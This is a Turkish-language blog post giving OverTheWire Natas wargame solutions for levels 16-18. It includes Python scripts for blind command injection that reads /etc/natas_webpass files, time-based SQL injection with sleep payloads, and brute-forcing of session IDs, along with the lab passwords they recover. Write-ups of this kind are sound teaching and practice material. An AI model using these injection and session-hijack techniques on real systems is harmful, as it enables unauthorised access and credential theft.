---
layout: post
title: "OverTheWire:Natas Solutions 16-28"
date: 2018-06-28
excerpt: "28 Jun 2018"
comments: false
---
#### Level 16

For security reasons, we now filter even more on certain characters.


<figure>
<img src="/assets/img/natas/level165.png">
</figure>

Level 10'a çok benzemekle birlikte, extra olarak; istemciden alınan değer çift tırnaklar içerisinde passhtru fonksiyonunun içerisine yerleştirilmiş.Yani Level 10'daki gibi `a /etc/natas_webpass/natas11 #` bir payload girmem durumunda,

grep -i "a /etc/natas_webpass/natas11 #" dictionary.txt şeklinde bir komut çalışacak ve dictionary.txt dosyasında bu payloadın geçtiği satırları getiricek. Dolayısıyla çıktı vermeyecek.  

Bu durumu bypass edebilmek için "command substition"  denilen şeyi yapacağız.

``` 
Command Substition

  Bir komutun çıktısını, bir değişkende saklama veya başka bir komut içinde kullanma manasına gelir.Basit bir örnekle;
  
  cur_dir=$(pwd)
  echo $cur_dir
  
  Bunu yapabilmenin iki yolu var.
  Backtick karakter " ` " veya $() kullanmak.
  
```
Burada backtick karakteri filtrelenmiş olduğu için ikinci yolu kullanacağız.

Payload olarak $(cat /etc/natas_webpass/natas17) girdiğimizde bu komutun çıktısı passthru fonksiyonun içerisine yerleştirilecek, daha sonrasında dictionary.txt dosyasında bu satır aranacak. Dolayısıyla  böyle bir kullanımdan ziyade passhtru içerisindeki grep komutunu manipüle etmemiz, true-false mantığıyla veriyi inşaa etmemiz gerekiyor. 

"Hacker" kelimesi ile arama yaptığımızda  çıktı bu şekilde.
<figure>
<img src="/assets/img/natas/natas162.png">
</figure>

"Hacker$(grep ^a /etc/natas_webpass/natas17)"  şeklinde bir input girdiğimde çıktı yine aynı.

```
"grep ^a /etc/natas_webpass/natas17" ifadesi /etc/natas_webpass/natas17 dosyasından a harfi ile başlayan satırları getir anlamına geliyor.
```

Demek ki parola a harfi ile başlamıyor, yani grep ^a /etc/natas_webpass/natas17 komutunun çıktısı yok. Eğer ki a harfi ile başlasaydı bu komutun çıktısı natas17'ye ait parola olacaktı.Dolayısıyla ;

grep -i " " dictionary.txt ifadesinde çift tırnaklar arasına natas17'e ait parola gelicekti ve dictionary.txt dosyasında böyle bir satır olmadığı için çıktı boş olucaktı.

Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
        for char in chars:
                s=requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=hacker$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)',auth=auth)
                if "hacker" not in s.text:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### Level 17

Level 15'in devamı niteliğinde.

<figure>
<img src="/assets/img/natas/natas171.png">
</figure>

Çıktı veren kısımlar yorum satırı haline getirilmiş. Time Based SQL Injection ile parolayı elde etmeyi deniyoruz.

natas18 " and password LIKE BINARY "a%" and sleep(3) şeklinde bir payload girdiğimde natas18 kullanıcısına ait parolanın a ile başlaması halinde 3 saniyelik bir bekleme olucak.

Benzer bir script çalıştırıyoruz.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwd=""
for i in range(32):
       for char in chars:
               payload = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(3) \x23'}
               s=requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload,auth=auth)
               time=s.elapsed.total_seconds()
               if time>1:
                        passwd=passwd+char
                        print passwd
                        break
{% endhighlight %}

>> natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### Level 18

<figure>
<img src="/assets/img/natas/natas181.png">
</figure>

<figure>
<img src="/assets/img/natas/natas182.png">
</figure>

Cookie başlığında  PHPSESSID değeri varsa , session başlatılıyor. Ardından print_credentials fonksiyonu çağrılıyor. Eğer SESSION içerisinde ki admin değeri 1' eşitse level 19'a ait parola ekrana bastırılıyor.Giden istekte PHPSESSID değeri yok ise, yeni bir session yaratılıyor.

Burada createID şeklinde bir fonksiyon çağırılmış.
{% highlight php %}
<?
function createID($user) { 
    global $maxid; 
    return rand(1, $maxid); 
}
?>
{% endhighlight %}

Fonksiyon session_id olarak 1 ile maxid değeri arasında random bir değer döndürüyor. 


<figure>
<img src="/assets/img/natas/natas183.png">
</figure>

Değer 640 olarak tanımlanırken, "640 should be enough for everyone" şeklinde bir not düşülmüş. Burdan anlıyoruz ki admin dahil tüm kullanıcılar için session_id değeri 1 ile 640 arasında.

{% highlight python %}

import requests
from requests.auth import HTTPBasicAuth
auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
for id in range(1,640):
               payload = {"username": "aa", "password": "aa"}
               id=str(id)
               cookie={'PHPSESSID':''+id+''}
               print cookie
               s=requests.post('http://natas18.natas.labs.overthewire.org/index.php',auth=auth,data=payload,cookies=cookie)
               if "You are an admin" in s.text:
                        print id
                        print s.text
                        break

{% endhighlight %}

>> natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

#### Level 19
